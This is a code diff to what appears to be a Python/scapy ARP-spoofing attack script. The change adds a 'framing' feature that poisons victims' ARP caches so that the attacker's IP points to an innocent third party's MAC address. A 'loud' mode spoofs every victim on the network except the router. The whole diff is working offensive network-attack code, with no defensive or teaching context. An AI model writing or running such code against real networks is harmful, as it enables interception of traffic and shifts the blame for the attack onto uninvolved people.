@@ -10,6 +10,11 @@ import threading
 
 arp_looping = False #set this to false to stop the thread
 
+arp_framing = False #set this to true to start framing
+loud_framing = False #frame mac to take all useless victim ips to others
+framed_mac = None #mac to frame
+
+
 ATTACKER_MAC = "ff:ff:ff:ff:ff:ff"
 
 # MAC address function which will return
@@ -163,6 +168,14 @@ def arp_scout_callback(packet):
         requestor_ip = packet[scapy.ARP].psrc
         victim_addresses[requestor_ip] = src_mac
 
+        
+        if arp_framing :
+            arp_frame(ATTACKER_IP) #give our ip to framed mac
+            if loud_framing :
+                for victim_ip in victim_addresses.keys():
+                    if not victim_ip == router_ip:
+                        arp_spoof(victim_ip, ATTACKER_IP)
+
         #do not answer immediatly after router does (when victim broadcasts)
         if not dst_mac == ATTACKER_MAC:
             time.sleep(2.0) #send after 2s to overwrite
@@ -194,9 +207,10 @@ def arp_loop():
         time.sleep(5)
 
 
-framed_mac = None
+
 def arp_frame(ip): #have framed_mac claim that they are the given ip
     for victim in victim_addresses.keys() :
-        arp_spoof(victim, ip, framed_mac)
+        if not victim == router_ip :
+            arp_spoof(victim, ip, framed_mac)
 
 
